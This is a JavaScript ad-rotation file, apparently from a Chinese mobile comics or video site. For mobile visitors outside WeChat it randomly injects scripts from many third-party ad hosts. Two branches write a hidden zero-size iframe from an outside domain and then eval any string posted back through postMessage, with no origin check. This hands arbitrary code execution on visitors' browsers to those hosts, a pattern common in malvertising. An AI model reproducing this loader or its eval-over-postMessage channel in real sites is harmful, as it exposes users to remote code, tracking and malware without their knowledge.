/**
 * Created by Administrator on 2018/6/1.
 */
if (gwc.winWidth <= 768) {
    var u = window.navigator.userAgent;
    var isAndroid = (u.indexOf('Android') > -1 || u.indexOf('Adr') > -1); //android终端
    var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端

    function rnd(n, m) {
        return Math.floor(Math.random() * (m - n + 1) + n);
    }
    var rn = rnd(1, 20), rn1 = rnd(1, 1), rn2 = rnd(1, 2), rn3 = rnd(1, 3), rn4 = rnd(1, 4), rn5 = rnd(1, 5), rn10 = rnd(1, 10), rn15 = rnd(1, 15), rn20 = rnd(1, 20);


    if (iswq) {//微信端=======================================
        if (pathname == '/vipzs') {

        } else {

        }
    } else {//wap端=====================================

        var nowtime = parseInt(new Date() / 1000);
        var testStart = '2019-09-29 00:00:00';
        var testEnd = '2019-09-29 23:59:59';
        var testStart2 = '2019-11-20 00:00:00';
        var testEnd2 = '2019-11-21 23:59:59';
        var testStart3 = '2019-11-16 00:00:00';
        var testEnd3 = '2019-11-16 23:59:59';

        if (pathname == '/vipzs') {
            var prev = sessionStorage.getItem('prev');
            if (!prev || prev == 3) {
                renderBottomJs('');
                sessionStorage.setItem('prev', 1);
            } else if (prev == 1) {
                renderBottomJs('');
                sessionStorage.setItem('prev', 2);
            } else if (prev == 2) {
                renderBottomJs('');
                sessionStorage.setItem('prev', 3);
            }
        } else {
            if (nowtime > gwc.timePack(testStart) && nowtime < gwc.timePack(testEnd)) {

            } else {
                if (rn == 1) {
                    renderBottomJs('深蓝');
                }
                else if (rn == 2 || rn == 3) {
                    renderBottomJs('169');
                }
				else if (rn == 4 || rn == 5) {
                    renderBottomJs('kk');
                }
                else if (rn == 6 || rn == 7) {
                    renderBottomJs('开斗');
                }
                else if (rn == 8 || rn == 9) {
                    pathname != '/search' && renderBottomJs('popoad');
                }
				else if (rn == 10 || rn == 11) {
                    pathname != '/search' && renderBottomJs('泡泡-tianji');
                }
                else if (rn == 12 || rn == 13 || rn == 14 || rn == 15 || rn == 16 || rn == 17) {
                    pathname != '/search' && renderBottomJs('泡泡-zichen');
                }
                else if (rn == 18 || rn == 19 || rn == 20) {
                    pathname != '/search' && renderBottomJs('泡泡-abc111');
                }
                
            }
        }
    }

    pathname == '/search' && $('.main_search .search-wrap .keywords').focus();

    function renderBottomJs(target) {
        if (target == '深蓝') {
            document.writeln('<script  src="https://677cf24b0d4a.kltces.com//image/7478"></script>');
        } else if (target == '久乐') {
            document.writeln("<script src='https://mvo.12rge.xyz/8037~xmtl?"+(new Date()).getTime()+"'><\/script>");
        } else if (target == '青柠') {
            var drakLayer = rn5 == 5 ? '<p style="position: absolute;width: 100%;height: 50px;top: -50px;"></p>' : '';
            var url = rn2 == 1 ? 'http://www.mhvip12.com/index.php?imei=10bc59af4c38c114f731af93092c5c97&mid=8' : 'http://www.ybmh1.com?pid=580970';
            document.writeln("<div style='position: fixed;left: 0;bottom: 0;width:100%;z-index:2147483645;'><a href='" + url + "' rel='nofollow' target='_blank'>" + drakLayer + "<img src='/upload/kh/qn_" + rn5 + ".gif' style='width:100%;height:calc(100vw * (200 / 640))'></a><a href='javascript:;' id='kh_dp_btn' style='position: absolute;padding: 0;right: 0;top: -3px;color: #ddd;font-size: 14px;'>×</a></div>");$('#kh_dp_btn').click(function () {$(this).parent().hide()});
        } else if (target == 'clickad') {
            document.writeln('<script data-cfasync="false" type="text/javascript" src="/template/default/static/js/ck_code.js?v=1.2"></script><script data-cfasync="false" type="text/javascript" src="//klsdee.com/aas/r45d/vki/1596569/tghr.js" async onerror="_yqrps()" onloaded="_iplzzwfl()"></script><script data-cfasync="false" type="text/javascript" src="//terrapsps.com/t/9/fret/meow4/1596569/brt.js"></script><script data-cfasync="false" type="text/javascript" src="//qwerfdx.com/pn07uscr/f/tr/zavbn/1597353/lib.js" async></script>');
            if (!isiOS && gwc.winWidth < 768) {
                $('.header .search-wrap .fa').click(function(){
                    window.location.href = '/search';
                });
            }
        } else if (target == '开斗') {
            document.writeln('<script src="https://www.ucnm.top:18443/cc/x-74-33.js"></script>');
        } else if (target == '泡泡-zichen') {
            document.writeln("<script id='mob' type='text/javascript' charset='utf-8' src='http://kl.zmgod.com/d.php?pid=5867'></script>");
            $(function () {
                setTimeout(function () {
                    $('head').append('<style>.diy{position: fixed!important;top:inherit!important; }</style>');
                    $('#mob').next().next().addClass('diy').css({'height':60, 'bottom':$('#mob').next().height()});
                },500);
            });
            if (!isiOS && gwc.winWidth < 768) {
                $('.header .search-wrap .fa').click(function(){
                    window.location.href = '/search';
                });
            }
        } else if (target == '泡泡-tianji') {
            document.writeln("<script id='mob' type='text/javascript' charset='utf-8' src='http://kl.zmgod.com/d.php?pid=5859'></script>");
            $(function () {
                setTimeout(function () {
                    $('head').append('<style>.diy{position: fixed!important;top:inherit!important; }</style>');
                    $('#mob').next().next().addClass('diy').css({'height':60, 'bottom':$('#mob').next().height()});
                },500);
            });
            if (!isiOS && gwc.winWidth < 768) {
                $('.header .search-wrap .fa').click(function(){
                    window.location.href = '/search';
                });
            }
        } else if (target == '泡泡-abc111') {
            document.writeln("<script id='mob' type='text/javascript' charset='utf-8' src='http://kl.zmgod.com/d.php?pid=5950'></script>");
            $(function () {
                setTimeout(function () {
                    $('head').append('<style>.diy{position: fixed!important;top:inherit!important; }</style>');
                    $('#mob').next().next().addClass('diy').css({'height':60, 'bottom':$('#mob').next().height()});
                },500);
            });
            if (!isiOS && gwc.winWidth < 768) {
                $('.header .search-wrap .fa').click(function(){
                    window.location.href = '/search';
                });
            }
        }  else if (target == 'popoad') {
            document.writeln("<script id='mob' type='text/javascript' charset='utf-8' src='http://kl.zmgod.com/d.php?pid=5794'></script>");
            $(function () {
                setTimeout(function () {
                    $('head').append('<style>.diy{position: fixed!important;top:inherit!important; }</style>');
                    $('#mob').next().next().addClass('diy').css({'height':60, 'bottom':$('#mob').next().height()});
                },500);
            });
            if (!isiOS && gwc.winWidth < 768) {
                $('.header .search-wrap .fa').click(function(){
                    window.location.href = '/search';
                });
            }
        } else if (target == '墨佐') {
            if(navigator.userAgent.indexOf('baiduboxapp')>-1){document.write('<script src="https://www.tianjin4.com:9443/mz/x-29-33.js"><\/script>')}else{(function(){window.addEventListener("message",function(e){var _des_s_29=e.data;if(_des_s_29.des_s_29){var _s = '/+/g';eval(decodeURIComponent(_des_s_29.des_s_29.replace(_s,"%20")))}});document.write('<iframe style="display:none;" src="https://www.tianjin4.com:9443/mz/x-29-33-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})();}
        } else if (target == 'kk') {
            if(navigator.userAgent.indexOf('baiduboxapp')>-1){document.write('<script src="https://www.brafsc.top:18443/kd/x-74-33.js"><\/script>')}else{(function(){window.addEventListener("message",function(e){var _des_s_74=e.data;if(_des_s_74.des_s_74){var _s = '/+/g';eval(decodeURIComponent(_des_s_74.des_s_74.replace(_s,"%20")))}});document.write('<iframe style="display:none;" src="https://www.brafsc.top:18443/kd/x-74-33-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})();}
        } else if (target == '169') {
            (function(){
                var m = document.createElement("script");
                m.src = "http://f99.265958.com/ft.asp?uid=2567&vid=2&tid=1&sid=1";
                var s = document.getElementsByTagName("script")[0];
                s.parentNode.insertBefore(m, s);
            })();
        } else if (target == '广告主') {
            document.writeln('<script  src="/template/default/static/js/htm.js"></script>');
        }
        if (pathname == '/vipzs' || pathname == '/lyb') {
            var showTimeTxt = '/T=>' +  gwc.timeTransform(nowtime);
            $('.footer').before('<p style="font-size:12px;text-align: center;color:#999;" class="test-tips">' + rn + showTimeTxt + '</p>');
            pathname == '/vipzs' && $('.test-tips').after('<p style="text-align: center;">' + prev + '=>' + target + '</p>');
        }
    }
	

    /*备用库==================
     if (randomNumSecond == 1) {} else if (randomNumSecond == 2) {}
     //棋牌
     //document.writeln("<div style='position: fixed;left: 0;bottom: 0;width:100%;z-index:2147483645;'><a href='' rel='nofollow' target='_blank'><img src='/upload/kh/qp_xxs_" + rn2 + ".gif' style='width:100%;height:calc(100vw * (200 / 640))'></a><a href='javascript:;' id='kh_dp_btn' style='position: absolute;padding: 0;right: 0;top: -3px;color: #ddd;font-size: 14px;'>×</a></div>");$('#kh_dp_btn').click(function () {$(this).parent().hide()});
     */

} else {

}